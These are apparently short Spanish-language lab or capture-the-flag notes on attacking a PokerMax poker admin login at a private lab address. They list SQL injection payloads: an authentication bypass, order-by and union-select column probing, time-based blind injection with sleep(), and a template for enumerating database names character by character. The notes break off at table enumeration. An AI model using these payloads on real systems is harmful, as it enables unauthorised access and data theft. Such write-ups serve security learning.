# casino
```bash
searchsploit PokerMax

# Se copia el txt con el script, en este caso un txt de una URL para autenticarnos
http://192.168.1.16/pokeradmin/index.php

# Se muestra la pantalla de login y se hace una inyección basica de SQL

user: ' or 1=1-- -
pass: 123

```
```bash
# Se abre burpsuite
# Se hace SQLI para ver la contraseña del admin
admin' or 1=1-- -
admin' order by 7-- - # se muestra el logueo (con 8 no se muestra)

# Se ocupa un union select para manipular un select
admin' union select 1,2,3,4,5,6,7-- -
admin' and sleep(5)-- -

# iinyecciones basadas en tiempo
select User, Password from user where User = 'root' and if(substr(database(),1,1)='m',sleep(3),1);-- -;

# enumeracion de bases de datos
"admin' and if(substr((select schema_name from information_schema.schemata limit %d,1),%d,1)='%s',sleep(1),1)-- -" % (dbs,position, character)

# enumeracion de tablas


```